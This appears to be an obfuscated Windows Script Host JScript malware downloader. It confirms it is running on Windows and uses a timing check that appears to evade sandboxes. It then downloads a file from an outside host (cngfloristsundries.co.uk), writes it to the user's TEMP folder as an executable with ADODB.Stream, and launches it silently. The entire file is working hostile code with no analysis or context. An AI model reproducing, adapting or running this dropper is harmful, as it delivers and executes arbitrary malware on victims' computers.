var c0 = false;
var i0 = "CreateObject";
var b = function RP() {return WScript[i0]("WScript.Shell");}(), kP = 11;
var C = "MSXML2.XMLHTTP";
var T = 2123213;
var RG = 0;
function dJ(ry){b["Run"](ry, RG, RG);};
function ZZ(){return "" + C;};
function dU(w, n){RG = RG * 1; return w - n;};
function Lr(){return i0;};
/*@cc_on
  @if (@_win32 || @_win64)
    c0 = true;
  @end
@*/
if (c0)
{
var ew = "";
function Y(){return 22;};
var Av = 0; var f = 0;
function i()
{
var o = new this["Date"]();
var k = o["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var o = new this["Date"]();
var SX = o["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var o = new this["Date"]();
var KE = o["getUTCMilliseconds"]();
var Av = "Fq";
Av = dU(SX, k);
var f = "zW";
f = dU(KE, SX);
ew = "open";
return dU(Av, f);
}
var r = false;
var Ri = false;
for (var W = RG; W < Y() * 1; W++){if (i() != RG){
r = true; 
f = "31" + 11 * Av + f; 
Ri = true; 
break;
}}
function uO() {return ((r == true) && (r == Ri)) ? 1 : RG;};
if (r && uO() && Ri){
function e() {return b["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "1XgeES9rVuAZhF.exe";};
 TQ = ZZ();
 q = WScript[i0](TQ);
 var Lg = 1;
 while (Lg){
try {
q[ew]("GET", "http://cngfloristsundries.co.uk/mo4erp", false);
q["send"]();
c = "Sleep";
for (;;){WScript[c](Y() * 11); if (q["readystate"] >= 2 * 2) break;};
Lg = RG;
} catch(y){};
}
function L(h) {var aO = (1, 2, 3, 4, 5, h); return aO;};
a = WScript[Lr()]("ADODB.Stream");
TQ = a;
TQ[ew]();
TQ["type"] = L(1);
TQ["write"](q["ResponseBody"]);
a["position"] = L(RG);
TQ["Save" + "ToFile"](e(), 2);
a["c"+"lose"]();
P = e();
dJ(P);
}
}

